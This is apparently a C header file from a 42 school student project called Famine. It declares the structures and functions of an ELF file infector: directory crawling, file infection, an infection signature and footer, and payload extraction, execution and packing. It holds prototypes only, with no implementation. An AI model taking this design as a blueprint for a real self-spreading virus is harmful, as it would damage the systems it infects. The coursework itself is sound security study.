/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   famine.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/03/04 11:29:36 by mbatty            #+#    #+#             */
/*   Updated: 2026/04/15 16:17:27 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma once

#include <stdint.h>

typedef struct	s_ctx
{
	char	exec_path[4096];

	char	**av;
	char	**envp;
}	t_ctx;

#define SIGNATURE_STR "Famine version 1.0 (c)oded by mbatty-mbatty"

typedef struct s_footer
{
	uint64_t magic;
	char	signature[sizeof(SIGNATURE_STR)];
	uint64_t payload_size;
}	t_footer;

#define FOOTER_MAGIC 0x4242424242424242

t_footer	get_footer(const char *path);

char	*strjoin(char const *s1, char const *s2);

int		infect_file(t_ctx *ctx, const char *path);
int		crawl_dir(const char *path, t_ctx *ctx);

int		check_signature(const char *path);
int		check_elf_hdr(const char *path);

int		extract_payload(const char *path, uint8_t **data, uint64_t *size);
int		exec_payload(t_ctx *ctx, uint8_t *data, uint64_t size);
void	pack_payload(const char *bin1_path, const char *bin2_path, const char *resbin_path);
